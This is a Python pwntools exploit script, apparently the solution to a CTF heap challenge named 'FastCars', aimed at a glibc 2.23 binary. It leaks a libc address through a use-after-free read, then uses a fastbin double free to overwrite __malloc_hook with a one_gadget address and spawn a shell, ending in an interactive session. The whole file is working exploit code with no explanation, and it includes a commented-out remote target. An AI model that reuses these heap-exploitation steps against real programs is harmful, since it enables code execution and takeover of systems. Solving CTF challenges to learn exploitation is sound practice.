#!/usr/bin/env python3



from pwn import * 


e = ELF("./FastCars_patched")
r = process("./FastCars_patched")
#r = remote("gc1.eng.run",31272)
libc = ELF("./libc-2.23.so")

def malloc_small(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"1") 
    r.sendlineafter(b"Model of Car:",data)


def malloc_medium(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Model of Car:",data)

def malloc_large(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Model of Car:",data)


def free(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Index:",f"{index}")


def read_libc(index):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Index:",f"{index}")
    r.recvuntil(b"Model:")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return leak


malloc_large(b"A"* 10)
malloc_small(b"B" * 10)
free(0)
libc_leak = read_libc(0)
libc_base = libc_leak - libc.sym["main_arena"] - 88
log.info("The libc base of the process is " + hex(libc_base))
malloc_large(b"C")
malloc_medium(b"D")
malloc_medium(b"E")
free(3)
free(4)
free(3)
malloc_hook = libc_base + libc.sym["__malloc_hook"] - 35
malloc_medium(p64(malloc_hook))
malloc_medium(b"F" * 8)
malloc_medium(b"G" * 8)
malloc_medium(b"A" * 19 + p64(libc_base + 0xf03a4)  + b"\x00" * 48)
r.sendlineafter(b">",b"1")
r.sendlineafter(b">",b"2")
r.interactive()